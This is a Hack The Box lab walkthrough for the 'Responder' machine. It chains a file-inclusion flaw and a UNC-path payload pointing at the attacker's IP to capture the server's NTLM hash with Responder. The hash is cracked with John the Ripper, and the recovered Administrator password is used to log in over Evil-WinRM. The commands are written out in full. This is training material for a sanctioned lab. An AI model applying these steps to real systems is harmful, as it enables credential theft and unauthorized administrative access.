
**Responder (HTB) Walkthrough**

**1. Reconnaissance**

An initial full TCP port scan was performed against the target system to identify all exposed network services.

    nmap -sS -sV -Pn -p- <target-ip>

Scan options explanation:

-   -sS performs a TCP SYN scan to identify open ports
-   -sV enables service and version detection
-   -Pn disables host discovery and assumes the host is online
-   -p- scans all 65535 TCP ports

The scan revealed the following open TCP ports:

-   80 – HTTP
-   5985 – WinRM (WSMan)

Since service and version detection was already enabled during the full port scan, no additional individual port scans were required.

**2. Hostname Resolution**

To ensure proper hostname resolution and consistent interaction with the web application, the target IP address was added to the local /etc/hosts file.

    sudo nano /etc/hosts

An entry mapping the target IP to the corresponding hostname was added:

    <target-ip> responder.htb

This allowed access to the web application using the expected hostname, which is sometimes required for correct application behavior.

**3. Service Identification**

Port 80 was identified as an HTTP web service hosting a PHP-based application. Port 5985 was identified as a WinRM service, allowing remote Windows management. Due to the presence of the HTTP service and known Windows NTLM authentication behavior, further investigation focused on potential file inclusion vulnerabilities and credential capture.

**4. File Inclusion Testing**

Accessing the web application in a browser revealed a page parameter controlling which language file is included, e.g., page=french.php. Testing revealed insufficient input validation, indicating a potential Local/Remote File Inclusion (LFI/RFI) vulnerability.

To capture credentials, the parameter was modified to reference a UNC path pointing to the attacker system:

    page=//<attacker-ip>/something

This caused the Windows server to attempt authentication to the remote share.

**5. NTLM Hash Capture**

Responder was started on the attacker’s interface to listen for incoming authentication attempts:

    responder -I tun0 -v

-   -I specifies the network interface to listen on
-   -v enables verbose output

When the target server attempted to access the UNC path, it automatically initiated NTLM authentication, which was captured by Responder as a hash.

**6. Hash Cracking**

The captured NTLM hash was cracked offline using John the Ripper with a wordlist:

    sudo john --wordlist=/usr/share/wordlists/rockyou.txt <hash.txt>

This revealed the plaintext Administrator password.

**7. Remote Access via WinRM**

The recovered credentials were used to authenticate to the target system over WinRM using Evil-WinRM:

    evil-winrm -u Administrator -p <password> -i <target-ip>

Authentication was successful, granting full administrative access to the system.

**8. Flag Discovery**

After logging in via WinRM, the flag was located within the Administrator’s profile or system directories. No additional privilege escalation was required.

**9. Exploitation Outcome**

The system was compromised due to a combination of a file inclusion vulnerability and default Windows authentication behavior. NTLM credentials were captured via Responder and cracked offline. The recovered credentials were reused to authenticate over WinRM, resulting in full administrative access and flag retrieval.


